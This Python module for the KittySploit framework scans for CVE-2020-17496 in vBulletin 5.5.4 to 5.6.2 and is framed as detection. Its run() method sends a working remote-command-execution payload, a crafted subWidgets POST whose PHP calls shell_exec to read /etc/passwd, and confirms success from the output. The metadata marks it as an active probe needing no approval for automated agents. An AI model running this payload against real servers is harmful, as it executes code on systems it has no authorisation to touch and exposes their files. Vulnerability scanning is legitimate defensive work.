#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vBulletin versions 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'vBulletin 5.5.4 - 5.6.2- Remote Command Execution Detection',
        'description': 'vBulletin versions 5.5.4 through 5.6.2 allow remote command execution via crafted subWidgets data in an ajax/render/widget_tabbedcontainer_tab_panel request. NOTE: this issue exists because of an incomplete fix for CVE-2019-16759.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2020', 'cve', 'vbulletin', 'rce', 'kev', 'tenable', 'seclists', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.tenable.com/blog/zero-day-remote-code-execution-vulnerability-in-vbulletin-disclosed',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-17496',
            'https://seclists.org/fulldisclosure/2020/Aug/5',
            'https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch',
            'https://cwe.mitre.org/data/definitions/78.html',
        ],
        'cve': 'CVE-2020-17496',
    }

    def run(self):
        path = '/ajax/render/widget_tabbedcontainer_tab_panel'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec(\'cat ../../../../../../../../../../../../etc/passwd\'); exit;"\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='vBulletin 5.5.4 - 5.6.2- Remote Command Execution detected', path=path)
            return True
        return False

